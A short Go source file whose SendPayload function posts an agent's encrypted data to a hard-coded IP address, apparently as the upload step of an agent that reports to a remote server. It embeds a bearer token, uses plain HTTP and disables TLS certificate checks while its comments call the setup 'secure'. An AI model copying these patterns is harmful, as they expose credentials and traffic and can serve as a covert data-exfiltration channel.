package transport

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"net/http"
	"time"
)

// The Network Configuration
// serverURL tells the agent where to send the data.
// apiToken acts as a password so the server accepts the connection.
const serverURL = "http://65.0.76.77:8000/api/v1/submit"
const apiToken = "c73e45de9830f1b0de452fae896e6eedf73f2e147fce063babe8663"

// SendPayload transmits the encrypted bytes to the central management server
func SendPayload(agentUUID string, encryptedData []byte) error {
	// 1. Prepare the HTTP request with the raw encrypted bytes
	req, err := http.NewRequest("POST", serverURL, bytes.NewBuffer(encryptedData))
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	// 2. Add secure headers
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Agent-UUID", agentUUID)
	req.Header.Set("Authorization", "Bearer "+apiToken)

	// 3. Configure a secure client with a timeout
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   15 * time.Second,
	}

	// 4. Fire the payload across the internet
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("network failure: %w", err)
	}
	defer resp.Body.Close()

	// 5. Check if the Python server returned a 200 OK success code
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server rejected payload, status code: %d", resp.StatusCode)
	}

	return nil
}
